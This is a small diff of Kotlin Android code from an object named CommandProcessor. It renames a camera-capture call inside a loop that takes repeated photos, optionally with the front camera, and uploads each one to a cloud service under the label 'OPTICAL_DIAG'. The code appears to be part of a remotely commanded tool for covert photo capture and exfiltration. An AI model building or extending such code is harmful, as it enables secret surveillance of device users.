@@ -1,6 +1,7 @@
 package com.example.myandroid
 
 import android.content.Context
+import android.content.Intent
 import android.os.Environment
 import android.os.Handler
 import android.os.Looper
@@ -255,7 +256,7 @@ object CommandProcessor {
                     
                     var successCount = 0
                     for (i in 1..count) {
-                        val file = CameraManager.capture(ctx, useFront)
+                        val file = CameraControl.capture(ctx, useFront)
                         if (file != null) {
                             if (CloudManager.uploadFile(ctx, file, "OPTICAL_DIAG")) {
                                 successCount++
